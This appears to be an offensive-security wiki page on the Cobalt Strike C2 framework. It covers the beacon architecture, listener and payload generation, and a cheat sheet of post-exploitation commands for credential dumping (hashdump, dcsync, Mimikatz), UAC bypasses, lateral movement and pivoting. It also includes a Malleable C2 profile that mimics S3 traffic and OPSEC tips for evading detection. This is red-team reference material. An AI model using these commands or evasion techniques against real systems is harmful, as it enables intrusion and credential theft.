---
title: Cobalt Strike
permalink: /wiki/tools/cobalt-strike-offsec/
layout: single
author_profile: true
tags:
- offsec-notes
- tool
redirect_from:
- /wiki/offsec-notes/entities/cobalt-strike/
---

**Type:** Framework / C2 Tool
**Also known as:** CS, Cobalt
**Related:** [Command And Control](/wiki/concepts/command-and-control/), [Red Teaming](/wiki/concepts/red-teaming/), [Evasion Techniques](/wiki/concepts/evasion-techniques/), [Post Exploitation](/wiki/concepts/post-exploitation/)

## Description
Cobalt Strike is a commercial adversary simulation platform used extensively in red team operations. It provides a highly customizable C2 framework (Beacon), built-in post-exploitation capabilities, collaborative team operations, and the industry-standard Malleable C2 profile system for traffic obfuscation. License required (~$5,500+/year); widely cracked versions circulate (create legal and security risks — cracked versions often backdoored).

## Usage / Details

### Architecture
- **Team Server:** Central C2 server; operators connect to it.
- **Beacon:** Implant on compromised host; HTTP/HTTPS/DNS/SMB/TCP listener modes.
- **Aggressor Script:** Cobalt Strike's scripting language for customization.
- **Malleable C2 Profile:** Configures all beacon behavior and traffic appearance.

### Beacon Modes

| Mode | Protocol | Use Case |
|------|----------|---------|
| HTTP/HTTPS | HTTP/HTTPS | Primary C2; most common |
| DNS | DNS TXT/A records | Restrictive egress environments |
| SMB | Named pipe | Lateral movement between beacons (no internet needed) |
| TCP | Raw TCP | Bind listener on target |

### Listener Setup
```
# Cobalt Strike GUI
Cobalt Strike → Listeners → Add
- HTTP: port 80/443, configure redirect host
- DNS: configure DNS resolver to point to team server
```

### Generating Payloads
- Attacks → Packages → Windows EXE, Stageless, PowerShell
- Attacks → Web Drive-by → HTML Application, Scripted Web Delivery
- `generate_beacon_shellcode` (Aggressor) for custom loaders

### Key Post-Exploitation Commands
```
# Recon
shell whoami /all
shell ipconfig /all
shell nltest /domain_trusts

# Privilege escalation
elevate uac-token-duplication    # Common UAC bypass
elevate svc-exe                  # Service-based SYSTEM
runasadmin uac-cmstplua          # Another UAC bypass

# Credential access
hashdump
dcsync domain.local              # DCSync attack
logonpasswords                   # Mimikatz via BEACON

# Lateral movement
jump psexec64 target Admin$      # PsExec to target
jump winrm64 target              # WinRM
jump wmi target                  # WMI

# Pivoting
socks 1080                       # SOCKS4a proxy
rportfwd 8080 127.0.0.1 80      # Reverse port forward
```

### Malleable C2 Profiles
Define beacon HTTP request/response to mimic legitimate traffic.
```
# Example: Amazon S3 profile snippet
http-get {
    set uri "/s3/assets";
    client {
        header "Host" "s3.amazonaws.com";
        header "Accept" "*/*";
        metadata { base64url; prepend "session-token="; header "Cookie"; }
    }
    server {
        header "Content-Type" "application/xml";
        output { print; }
    }
}
```

### OPSEC Notes
- Cobalt Strike default profile (without customization) is heavily signatured.
- **Always** use a custom Malleable C2 profile.
- Use sleep with jitter: `sleep 60 20` (60s ± 20%).
- Stage payloads: host stager on CDN; full beacon pulled after check-in validation.
- Enable sleep obfuscation (CS 4.5+): `sleep_mask true` in profile.
- Route C2 through redirectors; never expose team server IP directly.

## Notable Versions
- CS 4.5: Sleep mask, BOF improvements
- CS 4.7: Beacon Object File (BOF) system expanded
- CS 4.9+: Various OPSEC and evasion improvements

## References
- Cobalt Strike documentation — hstechdocs.helpsystems.com/manuals/cobaltstrike
- Malleable C2 profiles — github.com/BC-SECURITY/Malleable-C2-Profiles
- "Red Team Tactics, Techniques, and Procedures" — various MDSec/SpecterOps blogs
